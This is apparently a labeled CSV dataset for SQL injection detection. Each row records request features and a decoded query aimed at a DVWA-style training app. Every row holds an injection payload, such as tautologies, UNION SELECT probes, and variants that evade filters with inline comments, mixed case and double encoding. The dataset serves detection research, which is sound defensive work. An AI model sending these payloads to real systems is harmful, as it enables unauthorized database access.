url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
158,22,135,0,0,0,0,2,8,20,20,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,3910,1,13115,10,6928,id=id%3D1%27%2F%2A%2A%2FUnIoN%2F%2A%2A%2FsElEcT%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252F%252A%252A%252FUnIoN%252F%252A%252A%252FsElEcT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252F%252A%252A%252FUnIoN%252F%252A%252A%252FsElEcT%252F%252A%252A%252F1%252C2%252F%252A%252A%252F%252523&Submit=Submit,id=id%3D1%27%2F%2A%2A%2FUnIoN%2F%2A%2A%2FsElEcT%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523&Submit=Submit,sqli_case_var,1,existing_log_label,a44d1509f7494fe121d3aa9cdbdd00a2
57,22,34,0,0,0,0,0,0,4,4,1,0,1,1,0,3,0,0,3,1,0,9,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4045,1,13115,10,6928,"id=1'  SELECT  1,2  ;--  -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27++SELECT++1%2C2++%3B--++-,/vulnerabilities/sqli/,id%3D1%27++SELECT++1%2C2++%3B--++-,"id=1'  SELECT  1,2  ;--  -",sqli_case_var,1,existing_log_label,6621d97ae7bd7da20fe6eb47155e301c
71,22,48,0,0,0,0,0,0,10,10,1,0,0,1,0,0,0,7,10,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,748,1,13115,10,6928,"id=1'/**/select/**/1,2/**//*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%2F%2A%2A%2Fselect/**%2F1,2/%2A*%2F%2F%2A",/vulnerabilities/sqli/,"id%3D1'%2F%2A%2A%2Fselect/**%2F1,2/%2A*%2F%2F%2A","id=1'/**/select/**/1,2/**//*",sqli_case_var,1,existing_log_label,f7176e12a71da7090cd55fc37830bb3b
50,22,27,0,0,0,0,1,2,6,6,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1419,1,13115,10,6928,id=1' oR 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1%27%20oR%201%3D1%20/%2A,/vulnerabilities/sqli/,id=1%27%20oR%201%3D1%20/%2A,id=1' oR 1=1 /*,sqli_case_var,1,existing_log_label,9a131be2eec797a592d9e93b38ed6720
51,22,28,0,0,0,0,0,0,3,3,1,0,1,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,4408,0,13115,10,6928,"id=1' SELECT 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 SELECT+1,2+%3B--+-",/vulnerabilities/sqli/,"id%3D1%27 SELECT+1,2+%3B--+-","id=1' SELECT 1,2 ;-- -",sqli_case_var,1,existing_log_label,0bede76498a720646fd9c2bf16bc3c0e
79,22,56,0,0,0,0,0,0,16,16,1,0,0,0,0,0,1,6,9,2,0,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,4314,0,13115,10,6928,id=1'/**/aNd/**/1=1/**/#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FaNd%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%23,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FaNd%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%23,id=1'/**/aNd/**/1=1/**/#,sqli_case_var,1,existing_log_label,f388ae9fa0fd19f862b0ec910c8bf2fb
60,22,37,0,0,0,0,0,0,6,6,1,0,0,1,0,2,0,0,3,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2363,0,13115,10,6928,"id=1'%20SeLeCt%201,2%20--",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520SeLeCt%25201%2C2%2520--,/vulnerabilities/sqli/,id%3D1%27%2520SeLeCt%25201%2C2%2520--,"id=1'%20SeLeCt%201,2%20--",sqli_case_var,1,existing_log_label,8e0d5313f131bfdc34ce92fc524cfab7
46,22,23,0,0,0,0,1,10,4,4,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3948,0,13115,10,6928,id=1' Or 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27 Or+1=1+%2F%2A,/vulnerabilities/sqli/,id%3D1%27 Or+1=1+%2F%2A,id=1' Or 1=1 /*,sqli_case_var,1,existing_log_label,e87f012ad28630fa4a750b7815f9e0fc
54,22,31,0,0,0,0,0,0,7,7,1,0,0,0,0,3,0,0,3,2,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3117,0,13115,10,6928,id=1' or 1=1 -- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%20or%201%3D1%20--%20-,/vulnerabilities/sqli/,id%3D1%27%20or%201%3D1%20--%20-,id=1' or 1=1 -- -,sqli_case_var,1,existing_log_label,06edae50a41a10fd10580a3e8d8a188a
39,22,15,0,0,0,0,1,2,1,1,1,0,0,0,0,0,0,0,3,2,0,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,682,0,13115,10,6928,id=1' OR 1=1,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+OR 1%3D1 #,/vulnerabilities/sqli/,id=1'+OR 1%3D1 ,id=1' OR 1=1 ,sqli_case_var,1,existing_log_label,6daa39e2b345d1488a22b3ffa8940cab
87,22,64,0,0,0,0,2,8,8,8,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1582,0,13115,10,6928,id=id%3D1%27%09OR%091%3D1%09%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509OR%25091%253D1%2509%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509OR%25091%253D1%2509%252F%252A&Submit=Submit,id=id%3D1%27%09OR%091%3D1%09%2F%2A&Submit=Submit,sqli_case_var,1,existing_log_label,dce468a5d180cb12e0c145c61c0c74b7
38,22,15,0,0,0,0,1,2,0,0,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3565,0,13115,10,6928,id=1' oR 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+oR+1=1+/*,/vulnerabilities/sqli/,id=1'+oR+1=1+/*,id=1' oR 1=1 /*,sqli_case_var,1,existing_log_label,9a131be2eec797a592d9e93b38ed6720
61,22,38,0,0,0,0,0,0,4,4,1,0,1,1,0,3,0,0,3,1,0,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1865,0,13115,10,6928,"id=1'   SeLeCt   1,2   ;--   -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+++SeLeCt+++1%2C2+++%3B--+++-,/vulnerabilities/sqli/,id%3D1%27+++SeLeCt+++1%2C2+++%3B--+++-,"id=1'   SeLeCt   1,2   ;--   -",sqli_case_var,1,existing_log_label,fce8a121bdb23e115074c86cd482e964
42,22,19,0,0,0,0,1,2,0,0,1,0,0,1,0,2,0,0,3,1,0,4,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1581,0,13115,10,6928,"id=1' Select 1,2 --",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' Select 1,2+--",/vulnerabilities/sqli/,"id=1' Select 1,2+--","id=1' Select 1,2 --",sqli_case_var,1,existing_log_label,55af9a9f27cd67f9ba41e57f1df47a0c
10,10,0,25,0,0,1,0,0,0,0,1,0,0,0,0,2,0,0,1,2,0,11,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,1,200,0,1737,0,13115,10,6928,id=1'   oR   1=1   --,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_case_var,1,existing_log_label,6fae6228ea6ec84680fef8061516f081
55,22,32,0,0,0,0,0,0,8,8,1,0,0,0,0,0,0,1,4,2,3,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2684,0,13115,10,6928,id=1'+And+1=1+/*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2BAnd%2B1%3D1%2B%2F%2A,/vulnerabilities/sqli/,id%3D1%27%2BAnd%2B1%3D1%2B%2F%2A,id=1'+And+1=1+/*,sqli_case_var,1,existing_log_label,85cc515d2ec15311d5a7a2253b5dbec3
54,22,31,0,0,0,0,0,0,5,5,1,0,0,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3370,1,13115,10,6928,"id=1' select 1,2 -- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%20select%201,2%20--%20-",/vulnerabilities/sqli/,"id%3D1'%20select%201,2%20--%20-","id=1' select 1,2 -- -",sqli_case_var,1,existing_log_label,6cd0c19218a3cbb3ee18a4d89049f2e9
53,22,30,0,0,0,0,1,2,1,1,1,0,1,1,0,3,0,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1389,1,13115,10,6928,"id=1' Union Select 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+Union+Select+1,2+%3B--+-",/vulnerabilities/sqli/,"id=1'+Union+Select+1,2+%3B--+-","id=1' Union Select 1,2 ;-- -",sqli_case_var,1,existing_log_label,b36d60c6267acf460118485ea4fce3d7
53,22,30,0,0,0,0,1,2,1,1,1,0,1,1,0,3,0,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1910,0,13115,10,6928,"id=1' UnIoN sElEcT 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27+UnIoN+sElEcT+1,2+;--+-",/vulnerabilities/sqli/,"id=1%27+UnIoN+sElEcT+1,2+;--+-","id=1' UnIoN sElEcT 1,2 ;-- -",sqli_case_var,1,existing_log_label,7a75e710049f23c51bbcba63c7cfb370
11,11,0,21,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,2,2,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,0,1,200,0,3961,0,13115,10,6928,id=1' or 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_case_var,1,existing_log_label,896c71a5620e0eb178c7079b84f9d04c
51,22,28,0,0,0,0,0,0,2,2,1,0,0,1,0,0,1,0,3,1,0,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,710,0,13115,10,6928,"id=1' UNION select 1,2 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+UNION+select+1,2+%23",/vulnerabilities/sqli/,"id%3D1'+UNION+select+1,2+%23","id=1' UNION select 1,2 #",sqli_case_var,1,existing_log_label,7ad19f0fc04e6eaa130120aef05475ba
44,22,21,0,0,0,0,1,2,3,3,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3976,1,13115,10,6928,id=1' or 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'%20or%201=1%20/*,/vulnerabilities/sqli/,id=1'%20or%201=1%20/*,id=1' or 1=1 /*,sqli_case_var,1,existing_log_label,70da205cb8e75176ed6ae33640718d5a
56,22,33,0,0,0,0,0,0,3,3,1,0,0,1,0,0,1,0,3,1,0,8,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1974,0,13115,10,6928,"id=1'  Union select  1,2  #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+ Union select +1,2+ %23",/vulnerabilities/sqli/,"id%3D1%27+ Union select +1,2+ %23","id=1'  Union select  1,2  #",sqli_case_var,1,existing_log_label,066e07666beb2ecc8e2433e9b7c9d42a
53,22,30,0,0,0,0,0,0,4,4,1,0,1,0,0,3,0,0,3,2,0,9,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1724,0,13115,10,6928,id=1'  Or  1=1  ;--  -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27++Or++1%3D1++%3B--++-,/vulnerabilities/sqli/,id%3D1%27++Or++1%3D1++%3B--++-,id=1'  Or  1=1  ;--  -,sqli_case_var,1,existing_log_label,6306e116244d5cae4062499d72bef208
45,22,22,0,0,0,0,1,11,2,2,1,0,0,0,0,3,0,0,3,2,0,5,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,980,1,13115,10,6928,id=1' aNd 1=1 -- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+aNd+1=1+--+-,/vulnerabilities/sqli/,id%3D1%27+aNd+1=1+--+-,id=1' aNd 1=1 -- -,sqli_case_var,1,existing_log_label,bd08dca05ff63be52de117a250731115
84,22,61,0,0,0,0,0,0,16,16,1,0,0,1,0,0,0,6,9,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2482,0,13115,10,6928,"id=1'/**/select/**/1,2/**/%23",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2Fselect%2F%2A%2A%2F1%2C2%2F%2A%2A%2F%2523,"id=1'/**/select/**/1,2/**/%23",sqli_case_var,1,existing_log_label,a3c34389682e3ec3a670775e3872eb9a
62,22,39,0,0,0,0,0,0,7,7,1,0,0,1,0,0,0,1,4,1,0,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1756,1,13115,10,6928,"id=1' Union SELECT 1,2 /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'%20Union%20SELECT%201,2%20%2F%2A",/vulnerabilities/sqli/,"id%3D1'%20Union%20SELECT%201,2%20%2F%2A","id=1' Union SELECT 1,2 /*",sqli_case_var,1,existing_log_label,79d792cef5447d1dd246d26bc911c0dd
49,22,26,0,0,0,0,1,2,2,2,1,0,1,1,0,3,0,0,3,1,0,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3259,0,13115,10,6928,"id=1' SeLeCt 1,2 ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1%27 SeLeCt 1,2 %3B-- -",/vulnerabilities/sqli/,"id=1%27 SeLeCt 1,2 %3B-- -","id=1' SeLeCt 1,2 ;-- -",sqli_case_var,1,existing_log_label,eaeabfe17b19f74bbb2455f7bc4e48ad
43,22,19,0,0,0,0,0,0,3,3,1,0,0,0,0,0,0,0,3,2,0,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1898,0,13115,10,6928,id=1' Or 1=1,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+Or+1%3D1+#,/vulnerabilities/sqli/,id%3D1%27+Or+1%3D1+,id=1' Or 1=1 ,sqli_case_var,1,existing_log_label,c43d3a577ac46488ca7dc7742ee61991
28,28,0,32,0,0,1,0,0,0,0,1,0,0,1,0,0,1,0,3,1,0,6,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,1,200,0,1121,0,13115,10,6928,"id=1' UnIoN sElEcT 1,2 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli_blind/,/vulnerabilities/sqli_blind/,,,sqli_case_var,1,existing_log_label,d08d7a55ed0f760d92d6f1794a29e659
93,22,70,0,0,0,0,0,0,20,20,1,0,1,0,0,3,0,8,11,2,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2861,0,13115,10,6928,id=1'/**/oR/**/1=1/**/;--/**/-,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FoR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FoR%2F%2A%2A%2F1%3D1%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,id=1'/**/oR/**/1=1/**/;--/**/-,sqli_case_var,1,existing_log_label,36170f8404adc9348f2cb4a790db0322
57,22,34,0,0,0,0,0,0,7,7,1,0,0,0,0,0,1,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1883,0,13115,10,6928,id=1'%20OR%201=1%20#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520OR%25201%3D1%2520%23,/vulnerabilities/sqli/,id%3D1%27%2520OR%25201%3D1%2520%23,id=1'%20OR%201=1%20#,sqli_case_var,1,existing_log_label,54057a54018f184d6e7ae42bc310c988
45,22,22,0,0,0,0,0,0,3,3,1,0,0,0,0,0,0,1,4,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,3286,0,13115,10,6928,id=1' aNd 1=1 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1' aNd+1%3D1+/%2A,/vulnerabilities/sqli/,id%3D1' aNd+1%3D1+/%2A,id=1' aNd 1=1 /*,sqli_case_var,1,existing_log_label,b5f4c8bd717ab6730406a518416d70ca
106,22,83,0,0,0,0,2,8,8,8,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,2875,0,13115,10,6928,id=id%3D1%27%2520unIoN%2520Select%25201%2C2%2520%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520unIoN%252520Select%2525201%252C2%252520%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520unIoN%252520Select%2525201%252C2%252520%252523&Submit=Submit,id=id%3D1%27%2520unIoN%2520Select%25201%2C2%2520%2523&Submit=Submit,sqli_case_var,1,existing_log_label,78ee5bd7fb643968669ed73ecbad6989
55,22,32,0,0,0,0,0,0,5,5,1,0,0,1,0,0,0,1,4,1,0,7,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,1556,1,13115,10,6928,"id=1'  select  1,2  /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27++select++1%2C2++%2F%2A,/vulnerabilities/sqli/,id%3D1%27++select++1%2C2++%2F%2A,"id=1'  select  1,2  /*",sqli_case_var,1,existing_log_label,423738907be3580a7a33a8984e05c369
85,22,62,0,0,0,0,2,8,7,7,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,4015,0,13115,10,6928,id=id%3D1%27%09ANd%091%3D1%09%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2509ANd%25091%253D1%2509%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2509ANd%25091%253D1%2509%252523&Submit=Submit,id=id%3D1%27%09ANd%091%3D1%09%2523&Submit=Submit,sqli_case_var,1,existing_log_label,b903d2a962c1b185ffd6b6f60ade6ff4
47,22,24,0,0,0,0,1,2,0,0,1,0,0,0,0,0,0,7,10,2,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,546,0,13115,10,6928,id=1'/**/oR/**/1=1/**//*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'/**/oR/**/1=1/**//*,/vulnerabilities/sqli/,id=1'/**/oR/**/1=1/**//*,id=1'/**/oR/**/1=1/**//*,sqli_case_var,1,existing_log_label,5e8c165818cfc310a19ddc315d4c10de
47,22,24,0,0,0,0,1,10,3,3,1,0,1,0,0,3,0,0,3,2,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2917,1,13115,10,6928,id=1' oR 1=1 ;-- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27 oR 1=1 %3B-- -,/vulnerabilities/sqli/,id%3D1%27 oR 1=1 %3B-- -,id=1' oR 1=1 ;-- -,sqli_case_var,1,existing_log_label,9108fac036b30f7d049b3acb8aab3fce
48,22,25,0,0,0,0,1,11,5,5,1,0,0,0,0,0,1,0,3,2,0,4,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,4277,0,13115,10,6928,id=1' aNd 1=1 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1'%20aNd%201=1%20%23,/vulnerabilities/sqli/,id%3D1'%20aNd%201=1%20%23,id=1' aNd 1=1 #,sqli_case_var,1,existing_log_label,a0ef492ab84ee1d2745c508460098fa4
